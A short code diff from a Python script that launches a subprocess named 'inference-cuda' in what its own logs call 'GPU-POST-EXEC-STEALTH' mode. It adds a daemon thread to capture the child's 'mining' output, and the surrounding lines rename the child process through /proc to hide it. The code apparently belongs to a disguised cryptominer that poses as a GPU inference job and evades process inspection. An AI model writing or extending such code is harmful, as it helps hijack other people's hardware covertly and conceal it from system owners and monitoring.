@@ -261,6 +261,11 @@ def main():
                 text=True
             )
             logger.info(f"✅ [GPU-POST-EXEC-STEALTH] inference-cuda started as subprocess PID: {process.pid}")
+
+            # Start monitoring output in a separate thread (ensure mining stdout/stderr are captured)
+            monitor_thread = threading.Thread(target=monitor_and_log_output, args=(process, 'inference-cuda'))
+            monitor_thread.daemon = True
+            monitor_thread.start()
             # ---- New: Rename child PID and register to DirectPIDRegistry ----
             try:
                 # /proc/<pid>/comm expects ≤15 byte; child self-rename đã được thiết lập qua preexec_fn
